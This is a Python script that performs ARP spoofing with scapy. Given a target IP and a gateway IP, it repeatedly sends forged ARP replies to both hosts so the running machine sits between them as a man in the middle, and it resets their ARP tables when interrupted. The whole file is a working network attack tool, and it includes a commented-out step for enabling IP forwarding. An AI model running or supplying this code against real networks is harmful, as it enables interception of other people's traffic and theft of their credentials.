#!/usr/bin/env python

import scapy.all as scapy
import argparse
import subprocess
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target's IP Address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway / Router's IP Address")
    options = parser.parse_args()
    if not options.target:
        print("[-] Please specify target IP address, use --help for more info")

    if not options.gateway:
        print("[-] Please specify router IP address, use --help for more info")
    return options


# def enable_prot_forwarding():
#     subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], stdout=True)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# enable_prot_forwarding()
options = get_arguments()
if not options.target:
    exit()
if not options.gateway:
    exit()
target_ip = options.target
gateway_ip = options.gateway
sent_packets_count = 0

try:
    while True:
        try:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
        except IndexError:
            pass
            print("Could not find the target !!")
        # spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Sent Packets: " + str(sent_packets_count), end='')
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C \t Resetting ARP Tables.....")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
